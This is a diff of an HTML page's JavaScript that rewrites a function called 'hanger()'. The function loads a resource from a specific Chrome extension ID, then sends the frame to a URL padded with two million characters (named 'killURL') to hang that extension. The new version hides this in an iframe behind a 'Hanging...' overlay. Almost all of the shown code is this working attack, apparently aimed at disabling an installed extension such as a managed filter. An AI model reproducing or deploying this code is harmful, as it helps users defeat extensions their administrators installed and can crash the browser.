@@ -69,21 +69,67 @@
     	}
     </style>
     <script>
-        function hanger() {
-            let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
-            let extWin = window.open(extURL);
-            setTimeout(function() {
-                let killURL = "https://" + "e".repeat(2000000);
-                extWin.location.href = killURL;
-                let iframe = document.createElement("iframe");
-                iframe.src = extURL;
-                document.body.appendChild(iframe);
+	function hanger() {
+    	    let overlay = document.createElement("div");
+    	    overlay.id = "overlay";
+    	    overlay.style.position = "fixed";
+    	    overlay.style.top = "0";
+    	    overlay.style.left = "0";
+    	    overlay.style.width = "100%";
+    	    overlay.style.height = "100%";
+    	    overlay.style.background = "rgba(0, 0, 0, 0.7)";
+    	    overlay.style.color = "white";
+    	    overlay.style.display = "flex";
+    	    overlay.style.flexDirection = "column";
+    	    overlay.style.alignItems = "center";
+    	    overlay.style.justifyContent = "center";
+    	    overlay.style.fontSize = "24px";
+    	    overlay.style.userSelect = "none";
+    	    overlay.style.textAlign = "center";
+    
+    	    let spinner = document.createElement("div");
+    	    spinner.style.width = "50px";
+    	    spinner.style.height = "50px";
+    	    spinner.style.border = "5px solid white";
+    	    spinner.style.borderTop = "5px solid transparent";
+    	    spinner.style.borderRadius = "50%";
+    	    spinner.style.animation = "spin 1s linear infinite";
+    
+    	    let style = document.createElement("style");
+    	    style.innerHTML = `@keyframes spin { 100% { transform: rotate(360deg); } }`;
+    	    document.head.appendChild(style);
+    
+    	    let hanging = document.createElement("div");
+    	    hanging.innerText = "Hanging...";
+    	    hanging.style.marginTop = "10px";
+    	    hanging.style.userSelect = "none";
+    	    hanging.style.textAlign = "center";
+
+   	    overlay.appendChild(spinner);
+    	    overlay.appendChild(hanging);
+    	    document.body.appendChild(overlay);
+
+    	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
+    	    let extFrame = document.createElement("iframe");
+    	    extFrame.src = extURL;
+    	    extFrame.style.display = "none";
+    	    document.body.appendChild(extFrame);
+    
+    	    setTimeout(function() {
+        	let killURL = "https://" + "e".repeat(2000000);
+        	extFrame.src = killURL;
+        	let iframe = document.createElement("iframe");
+        	iframe.src = extURL;
+        	document.body.appendChild(iframe);
+        
                 setTimeout(function() {
-                    extWin.close();
-                    createPopup();
-                }, 1000);
-            }, 100);
-        }
+            	    document.body.removeChild(extFrame);
+            	    document.body.removeChild(overlay);
+            	    createPopup();
+        	}, 1000);
+    	    }, 100);
+	}
+
 	function createPopup() {
             const overlay = document.createElement("div");
             overlay.style.position = "fixed";
